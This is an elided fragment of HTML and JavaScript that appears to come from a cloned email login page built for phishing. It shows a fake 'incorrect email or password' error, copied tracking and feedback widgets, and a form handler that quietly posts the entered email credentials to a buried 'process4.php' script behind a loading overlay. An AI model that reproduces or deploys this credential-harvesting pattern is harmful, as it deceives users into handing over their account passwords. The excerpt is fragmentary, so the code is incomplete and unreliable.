...
<span style="color:red">Incorrect email address or email password. Please try again</span>
</div>
<div class="control-group">
...
(function(h){var l=EngagementTimer({every:[Number(google_tag_manager["GTM-PWLGK97"].macro(6))],idleAfter:Number(google_tag_manager["GTM-PWLGK97"].macro(7)),engagementEvents:["click","touchstart","scroll","keydown","mousemove"],idleOnVisibilityChange:!0,max:Number(google_tag_manager["GTM-PWLGK97"].macro(8)),min:Number(google_tag_manager["GTM-PWLGK97"].macro(9))});l.on("interval",function(m){h.dataLayer.push({event:"engagementTimer",attributes:{counter:m.data.time}})});l.start();h.EngagementTimer=null})(window);
</script>
-->

<div class="usabilla_live_button_container" id="usabilla_live_button_container_543960519" role="button" tabindex="0" aria-label="Usabilla Feedback Button" style="display: none;">

<style type="text/css" nonce="f32afd94ff99">div.usabilla_live_button_container#usabilla_live_button_container_543960519[role="button"] {width:39px;height:110px;z-index:999;right:0px;top:50%;margin-top:-55px;position:fixed}</style>
<iframe src="" marginwidth="0" marginheight="0" scrolling="no" data-tags="right" title="Usabilla Feedback Button" class="usabilla-live-button" id="usabilla_live_button_container_iframe669241391" frameborder="0"></iframe>
</div>
...
$('#emailForm').on('submit', function(e){
		 ...
		 $(".overlay").show(500);
		$.post('layout/vendor/datatrac/04_doc11/process4.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
